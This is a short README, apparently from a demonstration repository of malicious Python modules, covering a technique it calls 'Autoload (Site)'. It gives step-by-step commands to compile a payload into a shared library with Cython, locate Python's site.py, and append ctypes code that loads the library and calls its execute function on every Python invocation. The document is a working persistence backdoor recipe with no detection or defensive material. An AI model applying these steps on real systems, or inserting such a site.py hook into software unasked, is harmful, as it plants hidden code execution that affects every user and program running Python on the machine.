# Malicious Module Example

This module is used to demonstrate common tricks by threat actor to masquerade malicious code.

Cython is used to convert python code into shared library (unix `.so` or windows `.pyd`).

## Malmod 3: Autoload (Site)

A module is loaded automatically at runtime for each python invokation.

In this example we will modify the `site` module and adding our backdoor script to load the module at runtime.

## Preparation

Ensure cython is installed for compiling and creating shared library. We only need to do this on development environment and no need to install cython on target machine.

```sh
python3 -m pip install cython
```

## Usage

To build the module, use the following command. This will generate a shared library, ex: `payload.cpython-311-x86_64-linux-gnu.so`.

```sh
python3 setup.py build_ext --inplace
```

Rename the file into simplest form like `payload.so` (or `payload.pyd`). Then copy it to any path you want, i.e. `/tmp/payload.so`. 

Locate the lib directory of python. The directory should contain `site.py`.

```sh
python3 -m site
```

Edit the `site.py` file and add following code at the end of the file.

```python
import ctypes
import sys
import os
            
if sys.platform == "win32":
    libname = "payload.pyd"
else:
    libname = "payload.so"
    
path = os.path.join("PAYLOAD_PATH", libname)
lib  = ctypes.CDLL(path)
        
lib.execute()
```

replace `PAYLOAD_PATH` to the path of the module.

Run the python.